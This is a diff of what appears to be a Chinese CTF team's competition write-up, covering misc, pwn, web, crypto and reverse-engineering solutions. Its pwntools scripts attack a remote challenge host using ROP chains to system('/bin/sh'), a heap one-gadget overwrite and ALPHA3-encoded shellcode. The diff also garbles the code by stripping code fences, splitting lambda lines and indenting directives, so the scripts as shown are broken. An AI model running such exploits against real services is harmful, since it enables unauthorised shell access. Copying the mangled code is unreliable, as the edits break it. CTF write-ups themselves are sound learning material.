@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-misc 
+misc
 
 Tr4ffIc_w1th_Ste90
 
@@ -402,7 +402,8 @@ c8f1f7b8-e531-402e-b1ec-cfd6e4000fa9
 
 图库下有水印照片以及原照片
 
-在C:UsersD0g3xGC下有flag4.zip，里面的enc_png是用python封装的，解一下就能看里面的逻辑了
+在C:
+UsersD0g3xGC下有flag4.zip，里面的enc_png是用python封装的，解一下就能看里面的逻辑了
 
 结束
 
@@ -475,11 +476,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 aaa=[
 ["00","aardvark","adroitness"],
 ["01","absurd","adviser"],
@@ -754,11 +750,6 @@ for i in ccc:
     ddd+=chr(int(i,16))
 
 print(ddd)
-```
-
-
-
-```
 #!/usr/bin/env python
 visit https://tool.lu/pyc/ for more information
 Version: Python 3.8
@@ -787,11 +778,6 @@ if name == '__main__':
     input_file = 'flag4.png'
     encrypted_file = 'flag4_encrypted.bin'
     encrypt_file(input_file, encrypted_file, key)
-```
-
-
-
-```
 #!/usr/bin/env python
 # Version: Python 3.8
 
@@ -819,18 +805,9 @@ if __name__ == '__main__':
     input_file = 'flag4_encrypted.bin'
     decrypted_file = 'flag4_decrypted.png'
     decrypt_file(input_file, decrypted_file, key)
-```
-
-
-
-```
 > python2 ./ALPHA3.py x64 ascii mixedcase rax --input="sandbox.bin"
-QXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjKTYfi9630t800T810T860T870T880t8B0T8J0T8K0T8L0T8M0T8O0T8P0T8T0T8U0T8V0T8W0t8b0T8g0T8h0T8i0T8j0T8n0T8oRAPZ0t8C0t8E0t8H0t8R0t8S0t8Y0t8Z0t8c0t8e0t8fZRAQZ0T8lZjNTYfi9yb0t800t820T8O0T8P0T8Q0T8R0T8TRAPZ0t83ZHpzflagUUUPH17HKodHAf1RM1RhTTUUXZPHGGTUUUHGFVUUUjUHAbIGBUTUUjqXZP#
-```
-
-
-
-```
+QXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjKTYfi9630t800T810T860T870T880t8B0T8J0T8K0T8L0T8M0T8O0T8P0T8T0T8U0T8V0T8W0t8b0T8g0T8h0T8i0T8j0T8n0T8oRAPZ0t8C0t8E0t8H0t8R0t8S0t8Y0t8Z0t8c0t8e0t8fZRAQZ0T8lZjNTYfi9yb0t800t820T8O0T8P0T8Q0T8R0T8TRAPZ0t83ZHpzflagUUUPH17HKodHAf1RM1RhTTUUXZPHGGTUUUHGFVUUUjUHAbIGBUTUUjqXZP
+#
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -843,18 +820,13 @@ def debug(c = 0):
         pause()
 def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
 
-#p=process("./pwn1")
+    #p=process("./pwn1")
 p=remote("125.70.243.22",31585)
 elf=ELF("./pwn1")
 p.recvuntil("Radiant powers, deadly tech. Here we go!")
 payload=b'QXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjKTYfi9630t800T810T860T870T880t8B0T8J0T8K0T8L0T8M0T8O0T8P0T8T0T8U0T8V0T8W0t8b0T8g0T8h0T8i0T8j0T8n0T8oRAPZ0t8C0t8E0t8H0t8R0t8S0t8Y0t8Z0t8c0t8e0t8fZRAQZ0T8lZjNTYfi9yb0t800t820T8O0T8P0T8Q0T8R0T8TRAPZ0t83ZHpzflagUUUPH17HKodHAf1RM1RhTTUUXZPHGGTUUUHGFVUUUjUHAbIGBUTUUjqXZP'
 p.send(payload)
 inter()
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
@@ -900,16 +872,11 @@ payload += p64(system)
 
 p.sendline(payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 from ctypes import *
 import base64
-#from LibcSearcher import *
+    #from LibcSearcher import *
 
 def debug(c = 0):
     if(c):
@@ -925,18 +892,24 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
 context(os='linux', arch='amd64', log_level='debug')
-#p = process('./pwn')
+    #p = process('./pwn')
 p=remote("125.70.243.22",31400)
 elf = ELF('./pwn')
 libc = ELF('libc.so.6')
@@ -979,21 +952,16 @@ create(6, 0x60)
 
 edit(6, b'x00'*0xb + p64(ogg) + p64(ogg))
 
-#debug('b *$rebase(0x13b1)')
+    #debug('b *$rebase(0x13b1)')
 
 create(7, 0x10)
 
-#pause()
+    #pause()
 
 lg('libc_base', libc_base)
 
-#debug()
+    #debug()
 inter()
-```
-
-
-
-```
 from pwn import *
 from struct import pack
 import ctypes
@@ -1042,11 +1010,6 @@ pay=p64(0x401511)
 p.send(pay)
 
 p.interactive()
-```
-
-
-
-```
 private static Boolean check(String uri) throws IOException, ParserConfigurationException, SAXException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setNamespaceAware(true);
@@ -1065,12 +1028,7 @@ private static Boolean check(String uri) throws IOException, ParserConfig
    int tag11 = doc.getElementsByTagNameNS("*", "useBean").getLength();
    return tag1 <= 0 && tag2 <= 0 && tag3 <= 0 && tag4 <= 0 && tag5 <= 0 && tag6 <= 0 && tag7 <= 0 && tag8 <= 0 && tag9 <= 0 && tag10 <= 0 && tag11 <= 0 ? true : false;
 }
-```
-
-
-
-```
-#sagemath
+    #sagemath
 
 from Crypto.Util.number import *
 
@@ -1126,12 +1084,7 @@ eG = mul(e, G)
 
 print(eG)
 
-#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)
-```
-
-
-
-```
+    #eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)
 //参考题目：https://www.cnblogs.com/Lovechan/articles/17704931.html
 
 import math
@@ -1143,11 +1096,6 @@ c = 82363935080688828403687816407414245190197520763274791336321809938555352729
 x = math.gcd(n,pow(2,n*d,n)-2)
 m = pow(c,d,x)
 print(bytes.fromhex(hex(m)[2:]))
-```
-
-
-
-```
 from secret import flag
 from Crypto.Util.number import*
 from gmpy2 import*
@@ -1178,16 +1126,11 @@ n = 53940389487194577982720217406130297034108245592836413744496284435903992416
 d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009
 c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175
 '''
-```
-
-
-
-```
-#include <stdio.h>
-#include <string.h>
-#include <stdint.h> 
-#define DELTA 0x61C88647
-#define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[((p&3)^e)&0xff] ^ z))) 
+    #include <stdio.h>
+    #include <string.h>
+    #include <stdint.h> 
+    #define DELTA 0x61C88647
+    #define MX (((z>>5^y<<2) + (y>>3^z<<4)) ^ ((sum^y) + (key[((p&3)^e)&0xff] ^ z))) 
 void btea(uint32_t* v, int n, const uint32_t key[4])
 {
     uint32_t y, z, sum; 
